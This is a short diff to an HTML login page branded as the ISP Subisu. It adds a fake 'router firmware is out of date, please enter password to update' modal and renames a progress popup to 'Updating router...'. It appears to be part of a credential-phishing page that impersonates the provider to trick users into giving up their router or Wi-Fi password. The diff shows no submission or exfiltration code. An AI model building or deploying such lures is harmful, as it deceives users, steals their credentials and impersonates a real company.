@@ -7,6 +7,14 @@
   <link rel="stylesheet" href="css/style.css">
 </head>
 <body>
+  <!-- Router-update modal -->
+  <div id="router-update-modal" class="update-modal">
+    <div class="update-modal-content">
+      <p>Your router’s firmware is out of date.<br>Please Enter Password to update.</p>
+      <button id="close-update-btn">OK</button>
+    </div>
+  </div>
+
   <!-- Main login container -->
   <div class="container">
     <div class="login-box">
@@ -36,7 +44,7 @@
         </div>
       </form>
       <p class="copyright">
-        © 2022 Subisu. All rights reserved.
+        © 2025 Subisu. All rights reserved.
       </p>
       <div id="messageBox" class="message-box"></div>
     </div>
@@ -46,7 +54,7 @@
   <div id="updating-popup" class="updating-popup">
     <div class="popup-content">
       <div class="spinner"></div>
-      <p>Updating password…</p>
+      <p>Updating router...</p>
       <button id="cancel-update">Cancel</button>
     </div>
   </div>
